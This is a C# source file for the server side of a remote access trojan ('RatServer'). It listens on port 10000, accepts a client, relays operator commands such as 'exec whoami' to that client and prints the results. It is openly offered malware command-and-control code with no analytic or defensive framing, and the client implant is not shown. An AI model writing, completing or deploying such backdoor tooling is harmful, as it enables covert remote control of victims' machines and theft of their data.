using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace RatServer // Uses RatServer.NetworkUtils
{
    public class RatServerApp
    {
        private const int Port = 10000;

        public static async Task Main(string[] args)
        {
            TcpListener listener = null;
            Socket clientSocket = null;
            Console.WriteLine($"RatServer (C#) started. Listening on port {Port}...");

            try
            {
                listener = new TcpListener(IPAddress.Any, Port);
                listener.Start();

                Console.WriteLine("Waiting for a client connection...");
                clientSocket = await listener.AcceptSocketAsync();
                Console.WriteLine($"Client connected: {clientSocket.RemoteEndPoint}");

                while (clientSocket.Connected)
                {
                    Console.Write("Enter command (e.g., 'exec whoami' or 'exit'): ");
                    string command = Console.ReadLine();

                    if (string.IsNullOrWhiteSpace(command))
                    {
                        Console.WriteLine("Command cannot be empty. Try again.");
                        continue;
                    }

                    byte[] commandBytes = Encoding.UTF8.GetBytes(command.Trim());
                    // NetworkUtils is now expected to be in the same RatServer namespace
                    await NetworkUtils.ReliableSendAsync(clientSocket, commandBytes);

                    if (command.Trim().ToLowerInvariant() == "exit")
                    {
                        Console.WriteLine("Exit command sent to client. Client should disconnect.");
                        break;
                    }

                    byte[] responseBytes = await NetworkUtils.ReliableReceiveAsync(clientSocket);
                    if (responseBytes == null)
                    {
                        Console.WriteLine("Client disconnected or connection lost while waiting for response.");
                        break;
                    }

                    string response = Encoding.UTF8.GetString(responseBytes);
                    Console.WriteLine($"Client response:\n--------------------\n{response}\n--------------------");
                }
            }
            catch (SocketException ex)
            {
                Console.WriteLine($"SocketException in Server: {ex.Message} (Error Code: {ex.SocketErrorCode})");
                if (ex.SocketErrorCode == SocketError.ConnectionReset || ex.SocketErrorCode == SocketError.ConnectionAborted)
                {
                    Console.WriteLine("The client connection was forcibly closed or reset.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An unexpected error occurred in Server: {ex.Message}\nStackTrace: {ex.StackTrace}");
            }
            finally
            {
                Console.WriteLine("Shutting down client communication resources...");
                if (clientSocket != null)
                {
                    if (clientSocket.Connected)
                    {
                        try
                        {
                            clientSocket.Shutdown(SocketShutdown.Both);
                        }
                        catch (SocketException se) { Console.WriteLine($"SocketException during client socket shutdown: {se.Message}"); }
                        catch (ObjectDisposedException) { /* Socket already closed, ignore */ }
                    }
                    clientSocket.Close();
                }

                listener?.Stop();
                Console.WriteLine("RatServer has finished processing the client and has shut down.");
            }
        }
    }
}
